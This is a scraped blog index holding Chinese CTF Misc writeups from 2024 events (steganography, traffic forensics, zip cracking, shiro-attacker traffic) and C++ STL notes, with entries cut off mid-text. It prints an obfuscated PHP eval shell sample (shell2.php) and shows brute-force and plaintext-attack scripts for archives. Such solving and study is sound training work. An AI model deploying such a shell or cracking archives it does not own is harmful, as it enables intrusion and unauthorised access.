虽然图片是不完整的，但是我们依旧可以用zsteg分析图片 虽然会报错，但是仍然可以得到这串十六进制数据 题目名称 变异凯撒(原题) 2024年郑州大学“奇安信杯”网络空间安全竞赛原题 https://second.certstone.top/2024-nian-zheng-zhou-da-xue-qi-an-xin-bei-wang-luo-kong-jian-an-quan-jing-sai-what-can-i-say-dui-wu-writeup/ ","date":"2024-10-21","objectID":"/posts/1eae35a/:0:0","tags":["CTF","Writeup","Misc"],"title":"2024 睿抗机器人开发者大赛（RAICOM）网络安全赛道初赛 Misc Writeup","uri":"/posts/1eae35a/"},{"categories":["Skills"],"content":"时间过得真快呀，回想上次做算法题应该是大一的时候了 没想到现在回过头来，依旧需要重新拾起自己的算法功底 输入与输出 函数 用法 scanf() 默认是以空白字符（空格、制表符、换行符）为分隔，当有多组样例的时候，可以使用while(scanf(\"%d\",\u0026a)!=EOF)来进行多组样例的输入 getchar() 从标准输入流中读取一个字符，常用来处理上一行末尾留下的换行符 fgets() fgets(a,MAX_LEN,stdin);读取一整行的文本，末尾会多一个换行符；可使用str[strcspn(str, \"\\n\")] = '\\0';进行处理 cin.getline() cin.getline(str, MAXN); 其中 str 是 char[]，读取一整行的文本，末尾没有换行符 getline() getline(cin,str)其中 str 是 string str，读取一整行的文本，末尾没有换行符 sprintf() sprintf(s, \"Integer: %d, Float: %.2f\", num, fnum);用于将格式化的数据写入到一个字符串中 istringstream iss(str) 流化一个字符串，从一个字符串中读取数据，包含在#include \u003csstream\u003e 文件头中 一些函数 字符串相关的一些函数 函数 用法 substr(pos,len) s.substr(pos,len)返回从字符串的 pos 位置开始，长度为 len 的子字符串 sprintf(字符数组,格式串,变量) 将变量按格式字符串的格式写入到字符数组 sscanf(字符数组,格式串,\u0026变量) 从字符数组中按格式串提取变量，返回成功提取的变量数量 strcspn(str,\"\\\\n\") 返回字符串 str 中第一个出现的字符 \\n 的位置 strcmp(s1,s2) 比较两个字符串的字典序大小, 如果s1=s2返回0, s1\u003es2返回正值, s1\u003cs2返回负值 strcat(s1,s2) 将字符串s2拼接到s1后面 strcpy(s1,s2) 将字符串s2复制到字符串s1中 string.erase(pos,len) .erase() 是 string 类型的成员函数,用于删除从 pos 开始长度为 len 的字符串 stoi(str) 将 string 类型的字符串转换为 int 类型，并且stoi 会隐式地将 char 数组转换为 string，然后再转换为整数 to_string() 用于将各种基本数据类型（如 int、float、double、long 等）转换为字符串string remove() remove(token.begin(), token.end(), ' ')将所有空格元素移动到末尾，并返回第一个空格的迭代器 atoi() 用于将字符串表示的整数转换为实际的整数值const char *str = \"12345\"; int num = atoi(str); stoi() 用于将字符串转换为整数string str = \"12345\";int num = stoi(str); stod() 用于将字符串转换为双精度浮点数string str = \"123.456\";double num = stod(str); to_string() 用于将数值类型（如整数、浮点数等）转换为 string 类型 C++的STL中一些常用的库函数 vector 数组 成员函数 用法 size() 返回数组当前包含的元素数量 empty() 检查当前的数组是否为空, 是则返回true, 否则返回false push_back() 在数组末尾添加一个元素 pop_back() 删除数组末尾最后一个元素 erase(pos,len) 删除数组从下标pos开始长度为len的元素 front() 返回数组第一个元素的引用 back() 返回数组最后一个元素的引用 begin() 返回数组第一个元素的迭代器 end() 返回数组最后一个元素后一个位置的迭代器 clear() 清空数组 vector\u003cint\u003e v(10) 初始化一个长度为10,元素默认为0的vector vector\u003cint\u003e v(10,5) 初始化一个长度为10,元素默认为5的vector map 关联容器 map会自动按照键值排序 成员函数 用法 size() 返回容器当前包含元素的数量 empty() 检查当前的数组是否为空, 是则返回true, 否则返回false begin() 返回数组第一个元素的迭代器 end() 返回数组最后一个元素后一个位置的迭代器 insert() 可以插入一个pair find() 若找到该元素则返回指向该元素的迭代器，否侧返回.end() lower_bound() 返回大于等于x的最小的数的迭代器 upper_bound() 返回大于x的最小的数的迭代器 clear() 清空容器 map\u003cstring, int\u003emp; mp[\"example\"] = 1; pair 模板类 using namespace std; typedef pair\u003cint, int\u003e PII; vector\u003cPII\u003e v; cout \u003c\u003c v[i].first \u003c\u003c \" \" \u003c\u003c v[i].second \u003c\u003c '\\n'; queue 队列 成员函数 用法 size() 返回队列长度 empty() 返回队列是否为空 push() 向队尾插入一个元素 front() 返回队头元素 back() 返回队尾元素 pop() 弹出队头元素 queue\u003cint\u003e q;// 循环队列 struct Person { int l, r; // 结构体rec中必须重载小于号 bool operator \u003c (const Person \u0026w) const { return l * r \u003c w.l * w.r; } }; priority_queue\u003cint\u003e q;// 大根堆 priority_queue\u003cint, vector\u003cint\u003e, greater\u003cint\u003e q;// 小根堆 priority_queue\u003cpair\u003cint, int\u003e\u003eq; priority_queue 优先队列 默认定义的话就是大根堆 priority_queue\u003cint\u003e heap; 如果需要定义小根堆的话 priority_queue\u003cint, vector\u003cint\u003e, greater\u003cint \u003e\u003e heap 成员函数 用法 push() 插入一个元素 top() 返回堆顶元素 pop() 弹出堆顶元素 priority_queue\u003cint\u003e maxHeap; int main() { maxHeap.push(10); maxHeap.push(20); maxHeap.push(5); maxHeap.push(30); while (!maxHeap.empty()) { cout \u003c\u003c maxHeap.top() \u003c\u003c '\\n'; maxHeap.pop(); } return 0; } priority_queue\u003cint, vector\u003cint\u003e, greater\u003cint\u003e \u003eminHeap; int main() { minHeap.push(10); minHeap.push(20); minHeap.push(5); minHeap.push(30); while (!minHeap.empty()) { cout \u003c\u003c minHeap.top() \u003c\u003c '\\n'; minHeap.pop(); } return 0; } stack 适配器容器 栈是一种 LIFO(后进先出) 的数据结构 stack\u003cint\u003e stk; 成员函数 用法 push() 将元素压入栈顶 pop() 移除栈顶元素 top() 访问栈顶元素 empty() 判断栈是否为空 size() 返回栈中的元素数量 set 关联容器 集合的元素具有唯一性 set\u003cint\u003e s; 成员函数 用法 insert() 将元素插入到集合中 erase() 删除指定元素, 参数可以是一个元素, 也可以是一个迭代器 find() 查找指定元素, 并返回指向该元素的迭代器, 如果找不到则返回 set.end(), 可以通过 *it 来访问元素 size() 返回集合中的元素数量 count() 判断某个元素是否存在, 返回0或1 clear() 清空集合 lower_bound() 返回大于等于x的最小的数的迭代器 upper_bound() 返回大于x的最小的数的迭代器 set的遍历 for (set\u003cint\u003e::iterator it = myset.begin();it!=myset.end();it++) { printf(\"%d \", *it); } // 在C++11以上版本可以用auto for (auto item : myset) { printf(\"%d \", item); } bitset 模板类 定义 bitset\u003c10000\u003e S; 成员函数 用法 count() 返回有多少个1 any() 判断是否至少有一个1 none() 判断是否全为0 set() 把所有位置置为1 set(k,v) 将第k位置成v reset() 把所有位置成0 flip() 等价于~ flip(k) 把第k位取反 查找相关的函数 函数 用法 find(iterator first, iterator last, const T\u0026 value","date":"2024-09-08","objectID":"/posts/552060f/:0:0","tags":["Skills"],"title":"Preparation For Programming Proficiency Exam","uri":"/posts/552060f/"},{"categories":["Writeup"],"content":"有段时间没有做CTF题了，感觉有些生疏了都，很可惜赛中差一题就能AK了 因此这个愿望只能留给学弟去实现了，之后可能真正能好好打CTF的机会也不多了吧 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 Checkin 题目附件给了一个压缩包，里面有一个Flag.txt 压缩包注释里的字符串base58解码后得到:Welcome2GZ 用vscode打开那个FLag.txt，发现有很多NULL字符，把NULL字符删掉然后导入010可以得到一个pacpng流量包文件 翻看流量包，发现里面主要是TLSv1.3和SMB3.1.1的流量 解密TLS需要 RSA私钥文件 或者 log日志文件，因此猜测跟之前txt文件中的那些NULL字符有关 赛后才猛然想起，很早之前自己博客中写过TXT的隐写还可以用wbStego4open这个工具 因此我们把之前得到的Welcome2GZ作为密钥用wbStego4open去解密TXT就能得到log日志文件 得到日志文件后用wireshark导入即可正常解密TLS流量（这里不清楚的话可以看我另一篇流量分析的博客） 然后翻看TLS流量，在流33中发现传输了一个flag.gif 直接手动把这个gif提取出来，然后发现存在时间轴隐写，这里我就直接使用puzzlesolver提取了（感谢B神） 最后CyberChef转二进制然后转字符串即可得到最后的flag：DASCTF{U_0wN_1T} 题目名称 hiden 题目附件给了下面这两个文件 txt文件的内容如下 GK4368 ;?:C ;G8F 34C2WVDJ?E]8\u003c8V[ V6@VX ?7 Di 8\u003c80B?8? l D]6C?BWX DGJC0JC2 l JC2W8\u003c80B?8?X 8\u003c80B?8? l DGJC0JC2]830@=8C7Wb[ @=8C36BC6 l VJG88JCVX Z 8\u003c80B?8? ;G8F ;?:C]34C2WQ8C78];?:Q[ Q6@QX ?7 Di ?886G@ l D]EC84?6?K7WX ;?:0B?8? l @=8C?66?=W D]6C?BD6?KC7W`X X D36 G2BC\u003c G2 6?2ECWJC2W8\u003c80B?8?XXi ;?:0B?8?,G2BC\u003c Y c. l 8\u003c80B?8?,G2BC\u003c. ;G8F ;?:C]34C2WQFGBC2];?:Q[ Q;@QX ?7 Di D]7C84?6?K7W?886G@X D];6G8CD6?KC7W;?:0B?8?X 随波逐流rot47解密可以得到下面的东西，一眼python脚本 然后再来一次rot13解密，即可得到下面这个加密脚本，刚好对应了文件名的提示：60=47+13 对照上面这个加密脚本，写一个脚本提取即可得到flag:DASCTF{12jkl-456m78-90n1234} import wave with wave.open(\"hiden.wav\", \"rb\") as f: wav_data = bytearray(f.readframes(-1)) file_len = int.from_bytes(wav_data[0:3*4:4], byteorder='little') extracted_data = bytes([wav_data[i*4] for i in range(3, 3 + file_len)]) print(extracted_data.decode('utf-8', errors='ignore')) # ok，now you find me,so the flag give you # DASCTF{12jkl-456m78-90n1234} 题目名称 1z_misc 题目附件给了一个 天机不可泄露.txt 还有一个加密的压缩包 txt的内容如下： 天地玄黄，宇宙洪荒；日月盈昃，辰宿列张；万物芸芸，息息相关；是以十二岁而行二十八宿，其间奥妙，待探寻，显真章。 若女可为11，可为1124……觜可为91，亦可为725……如此往复，周而复始。 祈解其秘：[43,101,55,16,16,1017,28,812,824,43,55,226,101,55,55,415,1017,1027,28,28,617,824,28,812,1027,16,101,16,55,1027,1017,28,16] 比赛中给出了下面这张图片作为hint 根据上面的信息，女可以是坐标(1,1)和坐标(11,24)位置，觜可以是(9,1)和(7,25)位置 根据 是以十二岁 可知十二时辰，每个时辰末尾对应的星宿为坐标开始的字 因此可以得到下面这张表 对照着可以得到以下内容： 心胃心奎奎心奎心胃心心心胃心心胃心奎奎奎奎胃奎心奎奎胃奎心奎心奎奎 转莫斯电码解码即可得到压缩包解压密码：E@SI1Y! 解压那个加密的压缩包后可以得到一个flag文件和一个hint.jpg hint文件中提示了天琴座，天琴座的英文是 lyra 联想到前不久2024ISCC考察的一道题目(有人让我给你带个话)，主要用到了这个开源项目 https://github.com/google/lyra 因此按照Github上的步骤安装一下lyra，这个项目需要使用 bazel 进行安装，所以安装lyra之前需要先安装bazel 安装完成后，把之前那段未知数据的后缀改为.lyra，然后使用lyra解码即可得到一个wav文件 打开wav，发现语音播报了社会主义核心价值观编码，因此直接找个在线网站识别然后解密即可 DASCTF{W0w!_You_d0_4_g00d_j0b!} 运气很好, 上次ISCC那道题拿了一血, 这次羊城杯的这题也拿了个一血 题目名称 不一样的数据库 题目附件给了一个压缩包，解压密码是弱密码直接爆破就行：753951 解压后得到一张定位块丢失的二维码，修复定位块 扫码可以得到以下内容 NRF@WQUKTQ12345\u0026WWWF@WWWFX#WWQXNWXNU rot13解密一下得到：AES@JDHXGD12345\u0026JJJS@JJJSK#JJDKAJKAH Title:passisDASCTF UserName:passisDASCTF Password:WBArAG6ku6ALmLGGn3iq Notes:给你了可以找到flag吗,真相就在其中 翻看历史记录，在里面找到一段AES加密的密文 U2FsdGVkX193h7iNsZs3RsLxH+V1zztkdS+fBy2ZQfzH77Uo4l3hSWplMV+GcLpAGflXlQuPTU5qIkOY7xJN9A== 用DASCTF作为密钥解一下这个AES即可得到flag:DASCTF{snsnndjahenanheanjjskk12235} 题目名称 miaoro 翻看流量包，发现执行的命令在请求头的 GWHT 字段中 在流10中发现执行了 echo Th15_11111111s_pP@sssssw000rd!!!\u003epass.txt 命令 在流13中发现下载了一个secret.txt base64解码响应的数据，发现有一个数据逆序的压缩包 手动提取出压缩包 用之前得到的密码：Th15_11111111s_pP@sssssw000rd!!! 解压压缩包可以得到一张 flag2.jpg 图片 根据题面的提示, 这个流量是某个漏洞利用工具的流量, 一开始不知道是哪个工具 因此我把响应包中的html代码复制出来并渲染,然后用谷歌识图搜索,很容易就搜到了是 shiro-attacker 的流量 对照着这篇 参考文章, 一步步进行解密 发现shiro-attacker内置字典的第十个密钥就是本题的密钥:MTIzNDU2Nzg5MGFiY2RlZg== 因此我们可以根据参考文章中的步骤用上面那个密钥进行解密 然后使用 SerializationDumper 工具进行反序列化, 这里要注意先把前十六字节(IV)删去 反系列化完后即可得到第一段flag:DASCTF{B916CFEB-C40F-45D6-A7BC- 然后再回头看之前得到的那个flag2.jpg 用010的模板功能调整一下图片的宽, 可以得到下图 上网搜了一下, 发现是猫猫字母 对照着上面的这个表即可得到第二段flag:EBOFDELQDIAA} DASCTF{B916CFEB-C40F-45D6-A7BC-EBOFDELQDIAA} 题目名称 so_much 题目附件给了一个 c2hpZnQh.ad1 文件 使用 FTK image 进行挂载发现需要密码,文件名base64解码后可以得到提示:shift! 010打开, 发现文件末尾还有一段提示 结合之前得到的shift, 猜测挂载密码就是按shift键后的1234567即:!@#$%^\u0026 挂载后得到 0.crypto-343.crypto 这344个文件, 但是仔细查看发现其实一共只有两种文件, 因此猜测是转二进制 编写以下脚本读取二级制数据 import hashlib import libnum def get_file_md5(file_path): md5_hash = hashlib.md5() with open(file_path, \"rb\") as file: for chunk in iter(lambda: file.read(4096), b\"\"): md5_hash.update(chunk) return md5_hash.hexdigest() res = '' if __name__ == \"__main__","date":"2024-08-28","objectID":"/posts/4a27616/:0:0","tags":["CTF","Writeup","Misc"],"title":"2024 羊城杯网络安全大赛 Misc Writeup","uri":"/posts/4a27616/"},{"categories":["Writeup"],"content":"这场比赛开始的时候去成都线下打国赛决赛了 现在才有时间回来复现，发现这场比赛的Misc题出的都挺好的 png_master 010打开图片，发现文件末尾有一串base64编码后的字符串 Congratulations on finding the first paragraph of flag, but the understanding of png is just beginning. flag1:DASCTF{2fd9e9ff-e27 使用 pngcheck -v 检查图片，发现最后两个IDAT块不正常 经过尝试，发现是长度为3394的IDAT块的问题 提取出来，加上文件头尾并爆破CRC可以得到下图中的最后一段flag：a19131f86126} Tips：其实这里不补文件尾，只补文件头也是可以的 删除有问题的IDAT块和末尾多余的base64字符串后，把图片拉入 stegsolve 查看 发现 alpha 0-7 通道中有LSB隐写的痕迹 直接提取出来即可得到flag的中间部分：d-5405c5f5- 这里LSB隐写的提取也可以使用以下Python脚本提取 from PIL import Image img = Image.open('1.png') width, height = img.size # print(width, height) alpha_pixels = [] for y in range(height): for x in range(width): pixel = img.getpixel((x, y)) # print(pixel) # 只需要提取alpha通道的像素值即可 alpha_pixels.append(pixel[3]) for num in alpha_pixels: if num \u003e= 32 and num \u003c= 126: print(chr(num), end='') # d-5405-c5f5- DASCTF{2fd9e9ff-e27d-5405c5f5-a19131f86126} EZ_zip 附件给了一个zip压缩包，解压提示文件已损坏以及CRC校验错误 于是010打开查看，发现源数据区和目录区的文件名长度被改了 用010将文件名长度修改为7即可解决010模板报错的问题 然后发现目录区的压缩方法也被改了，使用010改回DEFLATE即可解决CRC校验错误的问题 解压压缩包，在320.zip中发现一个提示，解压密码是一个字节的数据 因此我们编写爆破脚本进行解压，解压出来后得到 AES-ECB.txt ，内容如下 64ZpNmbv2Hg4Jj9bH8Kv6D3OBliD9hgyI3vZWfMDJs2TcEwVnBmH/zkBtPBE3g8e the key may be on your journey？ 提示我们AES解密的密钥藏在之前每个压缩包的解压密码中 最后的爆破脚本如下 from Crypto.Util.number import * import pyzipper import os key = [] for i in range(320, 0, -1): filename = f\"{i}.zip\" for pwd in range(0, 256): pwd_bytes = long_to_bytes(pwd) # print(long_to_bytes(pwd)) zipfile = pyzipper.AESZipFile(filename, 'r', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) try: zipfile.setpassword(pwd_bytes) zipfile.extractall() zipfile.close() # 因为后面解密AES的时候需要用Hex格式，所以这里hex转换一下先 key.append(hex(pwd)[2:].zfill(2)) print(f\"第{i}个压缩包解压成功---------------\u003e\") os.remove(filename) break except: pass print(key) # ['11', 'bb', '99', '58', '0c', '61', '3a', '87', 'c5', '4e', '12', '48', '0a', 'a7', 'ff', '8c', '79', '8f', '71', 'ad', '28', '0f', '6b', 'a6', '9d', '4a', '44', '25', '22', '5e', '4e', 'c6', '11', 'bb', '99', '58', '0c', '61', '3a', '87', 'c5', '4e', '12', '48', '0a', 'a7', 'ff', '8c', '79', '8f', '71', 'ad', '28', '0f', '6b', 'a6', '9d', '4a', '44', '25', '22', '5e', '4e', 'c6', '11', 'bb', '99', '58', '0c', '61', '3a', '87', 'c5', '4e', '12', '48', '0a', 'a7', 'ff', '8c', '79', '8f', '71', 'ad', '28', '0f', '6b', 'a6', '9d', '4a', '44', '25', '22', '5e', '4e', 'c6', '11', 'bb', '99', '58', '0c', '61', '3a', '87', 'c5', '4e', '12', '48', '0a', 'a7', 'ff', '8c', '79', '8f', '71', 'ad', '28', '0f', '6b', 'a6', '9d', '4a', '44', '25', '22', '5e', '4e', 'c6', '11', 'bb', '99', '58', '0c', '61', '3a', '87', 'c5', '4e', '12', '48', '0a', 'a7', 'ff', '8c', '79', '8f', '71', 'ad', '28', '0f', '6b', 'a6', '9d', '4a', '44', '25', '22', '5e', '4e', 'c6', '11', 'bb', '99', '58', '0c', '61', '3a', '87', 'c5', '4e', '12', '48', '0a', 'a7', 'ff', '8c', '79', '8f', '71', 'ad', '28', '0f', '6b', 'a6', '9d', '4a', '44', '25', '22', '5e', '4e', 'c6', '11', 'bb', '99', '58', '0c', '61', '3a', '87', 'c5', '4e', '12', '48', '0a', 'a7', 'ff', '8c', '79', '8f', '71', 'ad', '28', '0f', '6b', 'a6', '9d', '4a', '44', '25', '22', '5e', '4e', 'c6', '11', 'bb', '99', '58', '0c', '61', '3a', '87', 'c5', '4e', '12', '48', '0a', 'a7', 'ff', '8c', '79', '8f', '71', 'ad', '28', '0f', '6b', 'a6', '9d', '4a', '44', '25', '22', '5e', '4e', 'c6', '11', 'bb', '99', '58', '0c', '61', '3a', '87', 'c5', '4e', '12', '48', '0a', 'a7', 'ff', '8c', '79', '8f', '71', 'ad', '28', '0f', '6b', 'a6', '9d', '4a', '44', '25', '22', '5e', '4e', 'c6', '11', 'bb', '99', '58', '0c', '61', '3a', '87', 'c5', '4e', '12', '48', '0a', 'a7', 'ff', '8c', '79', '8f', '71', 'ad', '28', '0f', '6b', 'a6', '9d', '4a', '44', '25', '22', '5e', '4e', 'c6'] # 因为压缩包的编号是逆序的，所以这里需要把密钥也逆序一下 print(''.join(key[::-1])) # c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec587","date":"2024-07-26","objectID":"/posts/067cfbd/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 DASCTF 暑期挑战赛 Misc Writeup","uri":"/posts/067cfbd/"},{"categories":["Writeup"],"content":"后来再回头看自己当初没做出来的题，也是感触颇深 谁偷吃的了我的外卖 附件给了一张 jpg 图片，foremost 一下可以得到一个压缩包，解压得到另一个加密的压缩包 看到里面有很多标好序号的文件，然后后面还跟有一串字符串 根据压缩包注释中的提示：- 要用 / 替换，基本可以猜测就是 base64 编码了 使用 Winrar 的生成报告功能提取所有文件的文件名 但是提取出来的文件名是乱序的，因此我写一个脚本排序并提取，然后把 - 用 / 替换 with open('1.txt', \"r\") as f: data = f.read().split() # 将数据按 \"_\" 前面的数字排序 sorted_data = sorted(data, key=lambda x: int(x.split('_')[0])) # print(sorted_data[:20]) # 连接排序后的字符串部分 result = ''.join([item.split('_')[1] for item in sorted_data]) result = result.replace(\"-\", \"/\") print(result) 将提取出来的数据 base64 解码后发现少了 zip 的文件头，之前压缩包中的注释也提示了这个 加上文件头后 From Hex 解码即可得到一个压缩包 在那个 md 文件中得到 flag 的第一部分 然后回头看之前那个压缩包，发现里面的两个文件和这个压缩包中的一样 因此猜测需要明文攻击，钥匙.png 也提示了我们需要用的压缩软件和压缩格式 方法一：Advanced Archive Password Recovery 爆破完后即可得到解密后的压缩包，在 txt.galf 中得到 reverse 的第二段 flag 方法二：bkcrack 把 钥匙.png 用 bandzip 的 正常压缩格式 压缩为 flag.zip，然后爆破密钥即可 CyberChef 中 reverse 一下即可得到最后的 flag：flag{W1sh_y0u_AaaAaaaaaaaaaaa_w0nderfu1_CTF_journe9} 明文混淆 附件给了一个压缩包，打开一看发现是 store 加密，因此猜测需要明文攻击 去网上搜了一下文件大小为 35821 的 LICENSE.txt，发现有个统一的标题 这个标题的长度也满足了明文攻击的要求，因此我们使用 bkcrack 进行明文攻击 在 shell2.php 中得到以下 php 代码，是微盾php混淆 \u003c?php $O00OO0=urldecode(\"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A\");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O(\"JE8wTzAwMD0idVNxTHlDandXcFpIaGlLbWZGR1ZUQmFOcllvSXpsZWd4Sk1iUkRVRUFrUWN0bnZzZE9QWGladnVUYWdmY0hiWFloZVdNeUtObEx3U2pvQ25ydEFCeE9RRHNKcGRrUG1JekdFVlJVRnFGSjlmd1hrZWJxYllEYVlHQVd0aWJXeFlSS3BDb1d5cmJsbzBxMnN0bzI5UGJaQkdObExHUnlRNEF0T2dzUFNlc2E5THBkc0VEeVJwVVhzZU5kVjRScDVyUjNtNHNkUkZJR0hPSTJ0bmJQdGxTS3oybEdIYkFHSE53Z3k1TlBiTk5QejROV0M1TnJMMElXU2RtcGQ5RlpJSGVaUDdua0MvRkI9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=\")); ?\u003e 这里这道题比较简单，只要按照步骤依次 echo 出来就能得到 flag \u003c?php $O00OO0=urldecode(\"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A\"); $O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30}; $O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24}; $OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24}; $OO0000=$O00OO0{7}.$O00OO0{13}; $O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30}; eval($O00O0O(\"JE8wTzAwMD0idVNxTHlDandXcFpIaGlLbWZGR1ZUQmFOcllvSXpsZWd4Sk1iUkRVRUFrUWN0bnZzZE9QWGladnVUYWdmY0hiWFloZVdNeUtObEx3U2pvQ25ydEFCeE9RRHNKcGRrUG1JekdFVlJVRnFGSjlmd1hrZWJxYllEYVlHQVd0aWJXeFlSS3BDb1d5cmJsbzBxMnN0bzI5UGJaQkdObExHUnlRNEF0T2dzUFNlc2E5THBkc0VEeVJwVVhzZU5kVjRScDVyUjNtNHNkUkZJR0hPSTJ0bmJQdGxTS3oybEdIYkFHSE53Z3k1TlBiTk5QejROV0M1TnJMMElXU2RtcGQ5RlpJSGVaUDdua0MvRkI9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=\")); //echo $O00O0O(\"JE8wTzAwMD0idVNxTHlDandXcFpIaGlLbWZGR1ZUQmFOcllvSXpsZWd4Sk1iUkRVRUFrUWN0bnZzZE9QWGladnVUYWdmY0hiWFloZVdNeUtObEx3U2pvQ25ydEFCeE9RRHNKcGRrUG1JekdFVlJVRnFGSjlmd1hrZWJxYllEYVlHQVd0aWJXeFlSS3BDb1d5cmJsbzBxMnN0bzI5UGJaQkdObExHUnlRNEF0T2dzUFNlc2E5THBkc0VEeVJwVVhzZU5kVjRScDVyUjNtNHNkUkZJR0hPSTJ0bmJQdGxTS3oybEdIYkFHSE53Z3k1TlBiTk5QejROV0M1TnJMMElXU2RtcGQ5RlpJSGVaUDdua0MvRkI9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=\"); $O0O000=\"uSqLyCjwWpZHhiKmfFGVTBaNrYoIzlegxJMbRDUEAkQctnvsdOPXiZvuTagfcHbXYheWMyKNlLwSjoCnrtABxOQDsJpdkPmIzGEVRUFqFJ9fwXkebqbYDaYGAWtibWxYRKpCoWyrblo0q2sto29PbZBGNlLGRyQ4AtOgsPSesa9LpdsEDyRpUXseNdV4Rp5rR3m4sdRFIGHOI2tnbPtlSKz2lGHbAGHNwgy5NPbNNPz4NWC5NrL0IWSdmpd9FZIHeZP7nk","date":"2024-07-17","objectID":"/posts/5de0d7e/:0:0","tags":["CTF","Writeup","Misc"],"title":"2023 春秋杯冬季赛 Misc Writeup","uri":"/posts/5de0d7e/"},{"categories":["Writeup"],"content":"忙里偷闲，稍微打了一下 2024WKCTF 练练手 Signin 附件就给了一段密文，后面给了提示才知道是 twin hex 编码 直接使用在线网站解密：https://www.dcode.fr/twin-hex-cipher 解密后得到一张base64编码后的图片，CyberChef 解码发现是张二维码，识别一下 WKCTF{hello_2024} 不套是你的谎言 题目附件给了一个 magic.txt，大致内容如下 0x450c0d0a 0x480d0d0a 0x90c0d0a 0x300d0d0a 0xe40c0d0a 0xf80c0d0a 0xc20b0d0a 0x600d0d0a 0x420d0d0a 0x4f0c0d0a 赛后知道了这个每一行都是不同 Python 版本 pyc 的 magic 头 因此根据网上的magic头与Python版本的对照表，编写以下脚本提取数据即可得到一个压缩包 from Crypto.Util.number import * def reverse_magic(magic_number): tmp = int(magic_number[2:],16) # long_to_bytes()默认是大端序 # 将十进制的长整型转换为 bytes 数据 tmp = long_to_bytes(tmp) # 将 bytes 数据按照小端序转换为int类型 number = int.from_bytes(tmp[:2],'little') return number PYTHON_MAGIC = { # Python 3 3000: (3, 0), 3010: (3, 0), 3020: (3, 0), 3030: (3, 0), 3040: (3, 0), 3050: (3, 0), 3060: (3, 0), 3061: (3, 0), 3071: (3, 0), 3081: (3, 0), 3091: (3, 0), 3101: (3, 0), 3103: (3, 0), 3111: (3, 0), # a4 3131: (3, 0), # a5 # Python 3.1 3141: (3, 1), # a0 3151: (3, 1), # a0 # Python 3.2 3160: (3, 2), # a0 3170: (3, 2), # a1 3180: (3, 2), # a2 # Python 3.3 3190: (3, 3), # a0 3200: (3, 3), # a0 3220: (3, 3), # a1 3230: (3, 3), # a4 # Python 3.4 3250: (3, 4), # a1 3260: (3, 4), # a1 3270: (3, 4), # a1 3280: (3, 4), # a1 3290: (3, 4), # a4 3300: (3, 4), # a4 3310: (3, 4), # rc2 # Python 3.5 3320: (3, 5), # a0 3330: (3, 5), # b1 3340: (3, 5), # b2 3350: (3, 5), # b2 3351: (3, 5), # 3.5.2 # Python 3.6 3360: (3, 6), # a0 3361: (3, 6), # a0 3370: (3, 6), # a1 3371: (3, 6), # a1 3372: (3, 6), # a1 3373: (3, 6), # b1 3375: (3, 6), # b1 3376: (3, 6), # b1 3377: (3, 6), # b1 3378: (3, 6), # b2 3379: (3, 6), # rc1 # Python 3.7 3390: (3, 7), # a1 3391: (3, 7), # a2 3392: (3, 7), # a4 3393: (3, 7), # b1 3394: (3, 7), # b5 # Python 3.8 3400: (3, 8), # a1 3401: (3, 8), # a1 3410: (3, 8), # a1 3411: (3, 8), # b2 3412: (3, 8), # b2 3413: (3, 8), # b4 # Python 3.9 3420: (3, 9), # a0 3421: (3, 9), # a0 3422: (3, 9), # a0 3423: (3, 9), # a2 3424: (3, 9), # a2 3425: (3, 9), # a2 } res = '' with open('magic.txt','r') as f: data = f.read().split() for magic_number in data: number = reverse_magic(magic_number) res = res + str(PYTHON_MAGIC[number][1]) # print(res) zip_data = long_to_bytes(int(res)) with open('flag.zip','wb') as f: f.write(zip_data) print(\"[+] 转换成功\") 得到的压缩包发现存在伪加密，解除伪加密后可以得到一个 secret.txt，内容如下： Please decrypt the flask-session, the password is weak. 